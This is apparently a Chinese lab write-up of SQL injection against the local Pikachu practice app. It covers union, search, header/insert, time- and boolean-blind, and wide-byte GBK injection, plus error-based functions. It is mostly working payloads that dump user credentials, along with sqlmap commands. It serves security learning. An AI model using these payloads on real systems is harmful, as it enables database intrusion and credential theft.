<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">猜字段数</span><br><span class="line">?name=a&#x27;) order by 2%23</span><br><span class="line"></span><br><span class="line">查询数据库名</span><br><span class="line">?name=1&#x27;) union select 1,database()%23</span><br><span class="line"></span><br><span class="line">查询表名</span><br><span class="line">?name=1&#x27;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br><span class="line"></span><br><span class="line">查询字段名</span><br><span class="line">?name=1&#x27;) union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;%23</span><br><span class="line"></span><br><span class="line">查询字段内容</span><br><span class="line">?name=1&#x27;) union select group_concat(username),group_concat(password) from users%23</span><br></pre></td></tr></table></figure>

<h3 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_x.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --batch -p name</span><br></pre></td></tr></table></figure>

<h1 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h1><p>输入”v”就会显示所有用户名中含有”v”的用户信息</p>
<p><img src="/images%5Cimage-20230109144137831.png" alt="image-20230109144137831"></p>
<p>这里肯定使用了sql语句的模糊查询</p>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select xx,xx,xx from xx where xxx like &#x27;%输入的值%&#x27;;</span><br></pre></td></tr></table></figure>

<p>LIKE 关键字支持百分号”%”(匹配任意长度字符)和下划线”_”(匹配单个字符)通配符</p>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_name like &quot;%TA%&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109144913575.png" alt="image-20230109144913575"></p>
<p>可以判断下服务端的通配符这些是怎么写的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=v%&#x27;%23</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109145416985.png" alt="image-20230109145416985"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=v&#x27;%23</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109145442722.png" alt="image-20230109145442722"></p>
<p>可以大致判断出源码可能为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select xxxx from xx where xxx like &#x27;%输入的值%&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">猜字段数</span><br><span class="line">?name=a%&#x27; order by 3%23</span><br><span class="line">这里的a需要使用有输出的字母，使用1，2等这种没有输出</span><br><span class="line"></span><br><span class="line">查询数据库名(为了方便观察，把查询的字符改成其他)</span><br><span class="line">?name=1%&#x27; union select 1,2,database()%23</span><br><span class="line"></span><br><span class="line">查询表名</span><br><span class="line">?name=1%&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br><span class="line"></span><br><span class="line">查询字段名</span><br><span class="line">?name=1%&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;%23</span><br><span class="line"></span><br><span class="line">查询字段内容</span><br><span class="line">?name=1%&#x27; union select 1,group_concat(username),group_concat(password) from users%23</span><br></pre></td></tr></table></figure>

<h3 id="sqlmap-3"><a href="#sqlmap-3" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_search.php?name=1&amp;submit=%E6%90%9C%E7%B4%A2&quot; --batch -p name</span><br></pre></td></tr></table></figure>

<p>详细可参考数字型注入(POST)</p>
<p><img src="/images%5Cimage-20230109150021856.png" alt="image-20230109150021856"></p>
<h1 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h1><p>根据提示</p>
<p>用户名密码为admin&#x2F;123456</p>
<p><img src="/images%5Cimage-20230109230812814.png" alt="image-20230109230812814"></p>
<p>可以知道，服务器收集了请求头的user-agent和http accept请求头</p>
<p>抓取该界面的数据包</p>
<p><img src="/images%5Cimage-20230109231026283.png" alt="image-20230109231026283"></p>
<p>更改user-agent为test</p>
<p><img src="/images%5Cimage-20230109231106364.png" alt="image-20230109231106364"></p>
<p>将user-agent改为分号，报错，存在sql注入</p>
<p><img src="/images%5Cimage-20230109231226177.png" alt="image-20230109231226177"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent: admin&#x27;,&#x27;&#x27;)#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109233012407.png" alt="image-20230109233012407"></p>
<p>该错误的意思是传入表的字段数和values值的个数不一样</p>
<p>通过这个其实能判断出其应该为insert注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert 表名(字段1,字段2,字段3，字段4) values(数据1,数据2,数据3,数据4);</span><br></pre></td></tr></table></figure>

<p>除了user-agent和accept请求头的值，该表还存储了其他的值，所以报错</p>
<h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h2><p>使用报错注入</p>
<h5 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select database()),&#x27;~&#x27;),1) or &#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109233600397.png" alt="image-20230109233600397"></p>
<p>其细节在insert注入中有详细说明</p>
<h5 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent: x&#x27; or updatexml(1,concat(&#x27;.&#x27;,(select username from users limit 0,1),&#x27;.&#x27;),1) or &#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109233713229.png" alt="image-20230109233713229"></p>
<h2 id="sqlmap-4"><a href="#sqlmap-4" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>将请求包保存为文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p User-Agent --batch</span><br></pre></td></tr></table></figure>

<h1 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h1><p>当输入任何数据后返回的信息都是同样的时候，可以尝试时间盲注，通过网页加载的时间判断是否存在注入</p>
<p><img src="/images%5Cimage-20230110084215643.png" alt="image-20230110084215643"></p>
<p>该页面无论输入什么输出的内容都是”i don’t care who you are!”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&quot; and sleep(2)%23 //正常加载</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and sleep(2)%23 //延迟2秒加载</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110085004995.png" alt="image-20230110085004995"></p>
<p>判断该注入为字符型注入，并且闭合是分号</p>
<h2 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h2><p>时间盲注猜解数据库信息和布尔盲注类似，不同的是多利用到if语句和sleep函数</p>
<h4 id="mysql-if"><a href="#mysql-if" class="headerlink" title="mysql if"></a>mysql if</h4><p>sleep(n)就是停止n秒，这里就不再提了</p>
<p><img src="/images%5Cimage-20230110085453488.png" alt="image-20230110085453488"></p>
<h4 id="猜数据库名长度"><a href="#猜数据库名长度" class="headerlink" title="猜数据库名长度"></a>猜数据库名长度</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if(length(database())&gt;=8,sleep(2),1)%23	# 返回时间4毫秒</span><br><span class="line">?name=lili&#x27; and if(length(database())&gt;=7,sleep(2),1)%23	# 返回时间2秒</span><br></pre></td></tr></table></figure>

<h4 id="猜数据库名"><a href="#猜数据库名" class="headerlink" title="猜数据库名"></a>猜数据库名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if(ascii(substr(database(),1,1))&gt;=112,sleep(2),1)%23	# 第一位112</span><br><span class="line">?name=lili&#x27; and if(ascii(substr(database(),2,1))&gt;=105,sleep(2),1)%23	# 第二位105</span><br></pre></td></tr></table></figure>

<h4 id="猜表信息"><a href="#猜表信息" class="headerlink" title="猜表信息"></a>猜表信息</h4><p>猜数据表个数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database())&gt;=5,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>猜表名长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;=8,sleep(2),1)%23		# 第一张表表名长度为8</span><br><span class="line">?name=lili&#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;=6,sleep(2),1)%23		# 第二张表表名长度为6</span><br></pre></td></tr></table></figure>

<p>猜表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;=104,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>通过修改limit、substr值来限制查询位置与个数</p>
<h4 id="猜字段信息"><a href="#猜字段信息" class="headerlink" title="猜字段信息"></a>猜字段信息</h4><p>猜字段个数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1)&gt;=4,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>猜字段名长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if(length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;  limit 0,1))&gt;=2,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>猜字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;104,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<h4 id="猜字段值"><a href="#猜字段值" class="headerlink" title="猜字段值"></a>猜字段值</h4><p>猜字段值个数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if((select count(id) from users)&gt;=3,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>猜字段值长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if(length((select username from users limit 0,1))&gt;=5,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>猜字段内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if(ascii(substr((select username from users limit 0,1),1,1))&gt;=97,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>不同的字段通过limit控制</p>
<p>字段中不同的字符通过substr控制</p>
<p>判断个数用lenth控制</p>
<h2 id="sqlmap-5"><a href="#sqlmap-5" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; -p name --batch</span><br></pre></td></tr></table></figure>

<h1 id="基于boolian的盲注"><a href="#基于boolian的盲注" class="headerlink" title="基于boolian的盲注"></a>基于boolian的盲注</h1><p>当没有任何输出的时候，就需要使用到盲注</p>
<p>布尔盲注的场景条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.没有任何报错输出</span><br><span class="line"></span><br><span class="line">2.能够判断出ture还是false(比如条件正确有结果错误没有结果)</span><br></pre></td></tr></table></figure>

<p>本题输入正确的用户名lili</p>
<p><img src="/images%5Cimage-20230109234433676.png" alt="image-20230109234433676"></p>
<p>输入错误的用户名</p>
<p><img src="/images%5Cimage-20230109234546270.png" alt="image-20230109234546270"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lili&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109234741138.png" alt="image-20230109234741138"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lili&#x27;#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109234818055.png" alt="image-20230109234818055"></p>
<p>所以可以判断出为字符型注入，且闭合为’</p>
<h2 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h2><p>盲注最麻烦的就是，正确会显示一个结果，错误又显示另一个结果，没有其余的显示</p>
<p>所以所有的数据库名，字段值等，只能靠猜</p>
<h3 id="猜数据库名长度-1"><a href="#猜数据库名长度-1" class="headerlink" title="猜数据库名长度"></a>猜数据库名长度</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and length(database())&gt;=7%23	# 回显正常</span><br><span class="line">?name=lili&#x27; and length(database())&gt;=8%23	# 回显异常</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109235411194.png" alt="image-20230109235411194"></p>
<p>数据库长度为7</p>
<h3 id="猜数据库值"><a href="#猜数据库值" class="headerlink" title="猜数据库值"></a>猜数据库值</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lili&#x27; and ascii(substr(database(),1,1))&gt;113#</span><br><span class="line"></span><br><span class="line">lili&#x27; and ascii(substr(database(),1,1))&gt;=112#</span><br></pre></td></tr></table></figure>

<p>p的ascii码为112</p>
<p><img src="/images%5Cimage-20230110000502120.png" alt="image-20230110000502120"></p>
<p>于是对每个字符都这么测</p>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lili&#x27; and ascii(substr(database(),2,1))&lt;112#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110000702020.png" alt="image-20230110000702020"></p>
<p>所以第二个字符在a-p之间</p>
<h5 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII()"></a>ASCII()</h5><p>输出指定字符的ascii码值</p>
<h5 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h5><p><img src="/images%5Cimage-20230110000156970.png" alt="image-20230110000156970"></p>
<h3 id="猜数据表个数"><a href="#猜数据表个数" class="headerlink" title="猜数据表个数"></a>猜数据表个数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lili&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;=6#</span><br></pre></td></tr></table></figure>

<p>原理如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select (select 1) &lt;= 1;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110001003872.png" alt="image-20230110001003872"></p>
<h3 id="猜数据表名长度"><a href="#猜数据表名长度" class="headerlink" title="猜数据表名长度"></a>猜数据表名长度</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;=9%23</span><br><span class="line">?name=lili&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;=8%23</span><br></pre></td></tr></table></figure>

<h3 id="猜数据表名"><a href="#猜数据表名" class="headerlink" title="猜数据表名"></a>猜数据表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">猜第一张表表名的第一个字符串</span><br><span class="line">?name=lili&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;=105%23</span><br><span class="line">?name=lili&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;=104%23</span><br><span class="line"></span><br><span class="line">猜第一张表表名的第二个字符串</span><br><span class="line">?name=lili&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;=116%23</span><br><span class="line"></span><br><span class="line">猜第二张表表名的第一个字符串</span><br><span class="line">?name=lili&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))&gt;=109%23</span><br><span class="line"></span><br><span class="line">猜第二张表表名的第二个字符串</span><br><span class="line">?name=lili&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))&gt;=101%23</span><br></pre></td></tr></table></figure>

<h3 id="猜字段个数"><a href="#猜字段个数" class="headerlink" title="猜字段个数"></a>猜字段个数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)&gt;=5%23</span><br><span class="line">?name=lili&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)&gt;=4%23</span><br></pre></td></tr></table></figure>

<h3 id="猜字段名长度"><a href="#猜字段名长度" class="headerlink" title="猜字段名长度"></a>猜字段名长度</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))&gt;=2%23</span><br><span class="line">?name=lili&#x27; and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))&gt;=2%23</span><br></pre></td></tr></table></figure>

<h3 id="猜字段名"><a href="#猜字段名" class="headerlink" title="猜字段名"></a>猜字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;=106%23</span><br><span class="line">?name=lili&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;=105%23</span><br></pre></td></tr></table></figure>

<h3 id="猜字段内容个数"><a href="#猜字段内容个数" class="headerlink" title="猜字段内容个数"></a>猜字段内容个数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and (select count(id) from users)&gt;=3	# 正常</span><br><span class="line">?name=lili&#x27; and (select count(id) from users)&gt;=4	# 异常</span><br></pre></td></tr></table></figure>

<h3 id="猜字段内容长度"><a href="#猜字段内容长度" class="headerlink" title="猜字段内容长度"></a>猜字段内容长度</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据表users下的username字段的第一、二行数据内容长度</span><br><span class="line">?name=lili&#x27; and length((select username from users limit 0,1))&gt;=5%23	# 第一行</span><br><span class="line">?name=lili&#x27; and length((select username from users limit 0,1))&gt;=7%23	# 第二行</span><br></pre></td></tr></table></figure>

<h3 id="猜字段内容"><a href="#猜字段内容" class="headerlink" title="猜字段内容"></a>猜字段内容</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">猜username字段的第一行内容的第一、二个字符串</span><br><span class="line">?name=lili&#x27; and ascii(substr((select username from users limit 0,1),1,1))&gt;=97%23	# 正常</span><br><span class="line">?name=lili&#x27; and ascii(substr((select username from users limit 0,1),2,1))&gt;=100%23	# 正常</span><br><span class="line"></span><br><span class="line">猜username字段的第二行内容的第一、二个字符串</span><br><span class="line">?name=lili&#x27; and ascii(substr((select username from users limit 0,1),1,1))&gt;=97%23	# 正常</span><br><span class="line">?name=lili&#x27; and ascii(substr((select username from users limit 0,1),2,1))&gt;=100%23	# 正常</span><br></pre></td></tr></table></figure>

<h2 id="sqlmap-6"><a href="#sqlmap-6" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>遇到盲注就别手注了，直接sqlmap或写脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_blind_b.php?name=lili&amp;submit=%E6%9F%A5%E8%AF%A2&quot; -p name --batch</span><br></pre></td></tr></table></figure>

<p>sqlmap都得跑一阵子</p>
<p><img src="/images%5Cimage-20230110001714570.png" alt="image-20230110001714570"></p>
<p>但这题sqlmap使用的是时间盲注</p>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.freebuf.com/articles/network/282252.html">https://www.freebuf.com/articles/network/282252.html</a></p>
<h4 id="魔术引号"><a href="#魔术引号" class="headerlink" title="魔术引号"></a>魔术引号</h4><p>magic_quotes_gpc（魔术引号开关）</p>
<p>magic_quotes_gpc函数在php中的作用是判断解析用户提交的数据</p>
<p>如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。</p>
<p>单引号（’）、双引号（”）、反斜线（\）等字符都会被加上反斜线</p>
<p>可以看出这个在一定程度上就能对sql注入进行防护，因为我们没法通过引号或双引号制造闭合，我们输入的内容就不会被当作sql语句执行</p>
<h4 id="GBK编码"><a href="#GBK编码" class="headerlink" title="GBK编码"></a>GBK编码</h4><p>GBK编码是我国自己的一套编码，许多系统仍在沿用，</p>
<p>gbk是一种多字符编码。他使用了双字节编码方案，因为双字节编码所以gbk编码汉字，占用2个字节。</p>
<p>而一个utf-8编码的汉字，占用3个字节。</p>
<p>例如：</p>
<p>0xD50×5C 对应了汉字“誠 ”，URL编码用百分号加字符的16进制编码表示字符，于是 %d5%5c 经URL解码后为“誠”。</p>
<h4 id="宽字节SQL注入的原理"><a href="#宽字节SQL注入的原理" class="headerlink" title="宽字节SQL注入的原理"></a>宽字节SQL注入的原理</h4><p>数据库编码为非英文编码就有可能产生宽字节注入(比如GBK编码)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET NAMES &#x27;gbk&#x27;</span><br><span class="line">或</span><br><span class="line">SET character_set_client =gbk</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110091916345.png" alt="image-20230110091916345"></p>
<p>由于有magic_quotes_gpc的存在，传入的特殊字符会被添加一个转义字符”\“</p>
<p>“\“的url编码为%5c</p>
<p>于是我们可以再添加一个字符凑成一个gbk汉字，这样就会将”\“过滤</p>
<p>例如，運’字的GBK编码是%df%5c</p>
<p>当传入的sql语句为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1\&#x27;#&#x27;</span><br></pre></td></tr></table></figure>

<p>添加%df后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1運&#x27;#&#x27;</span><br></pre></td></tr></table></figure>

<p>注意：具体显示可能不会显示汉字，而是一个乱码，这里仅作了解原理</p>
<h2 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h2><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1%df&#x27; or 1=1#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110092955693.png" alt="image-20230110092955693"></p>
<p>可以判断为宽字节注入</p>
<h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1%df&#x27; order by 2#		# 正常</span><br><span class="line">name=1%df&#x27; order by 3#		# 异常</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110093225671.png" alt="image-20230110093225671"></p>
<p>字段数为2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1%df&#x27; union select 1,2#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110093329224.png" alt="image-20230110093329224"></p>
<h4 id="获取数据库-1"><a href="#获取数据库-1" class="headerlink" title="获取数据库"></a>获取数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1%df&#x27; union select database(),2#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110093413618.png" alt="image-20230110093413618"></p>
<h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1%df&#x27; union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),2#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110093512717.png" alt="image-20230110093512717"></p>
<h4 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1%df&#x27; union select (select group_concat(column_name) from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database())limit 3,1)),2#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110093825765.png" alt="image-20230110093825765"></p>
<p>limit 3,1是用来选择数据库用的</p>
<p>select database()可能会有多行数据库，通过limit选择到想要的数据库</p>
<h4 id="获取字段值-1"><a href="#获取字段值-1" class="headerlink" title="获取字段值"></a>获取字段值</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1%df&#x27; union select (select group_concat(username) from users),(select group_concat(password) from users)#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110094054457.png" alt="image-20230110094054457"></p>
<h2 id="sqlmap-7"><a href="#sqlmap-7" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>sqlmap跑宽字节注入需要用到tamper</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--tamper unmagicquotes</span><br></pre></td></tr></table></figure>

<p>tamper是sqlmap的脚本，这里可以理解为sqlmap发送payload是将单引号前加一个%df</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_widebyte.php&quot; --data=&quot;name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; -p name --batch --tamper unmagicquotes</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110095012638.png" alt="image-20230110095012638"></p>
<h1 id="报错注入前置知识"><a href="#报错注入前置知识" class="headerlink" title="报错注入前置知识"></a>报错注入前置知识</h1><h3 id="xpath报错注入"><a href="#xpath报错注入" class="headerlink" title="xpath报错注入"></a>xpath报错注入</h3><p>在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml()</span><br><span class="line">extractvalue()</span><br></pre></td></tr></table></figure>

<p>当这两个函数在执行时，如果出现xml文档路径错误就会产生报错</p>
<h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><p>用于改变文档中符合条件的节点的值</p>
<p>语法： </p>
<p>updatexml（XML_document，XPath_string，new_value）</p>
<p>第一个参数：是string格式，为XML文档对象的名称</p>
<p>第二个参数：代表路径，Xpath格式的字符串</p>
<p>第三个参数：string格式，替换查找到的符合条件的数据</p>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1 from information_schema.tables where (updatexml(1,0x7e,3));</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109155137082.png" alt="image-20230109155137082"></p>
<p>由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select 666),0x7e),1);</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109155523640.png" alt="image-20230109155523640"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109160329164.png" alt="image-20230109160329164"></p>
<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>此函数从目标XML中返回包含所查询值的字符串 </p>
<p>语法：</p>
<p>extractvalue（XML_document，xpath_string） </p>
<p>第一个参数：string格式，为XML文档对象的名称</p>
<p>第二个参数：xpath_string（xpath格式的字符串） </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select 111),0x7e));</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109155950514.png" alt="image-20230109155950514"></p>
<p>concat用于连接两个字符串</p>
<p><img src="/images%5Cimage-20230109160149638.png" alt="image-20230109160149638"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109160306652.png" alt="image-20230109160306652"></p>
<h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><p>原理可以参考</p>
<p><a href="https://www.freebuf.com/articles/web/242986.html">https://www.freebuf.com/articles/web/242986.html</a></p>
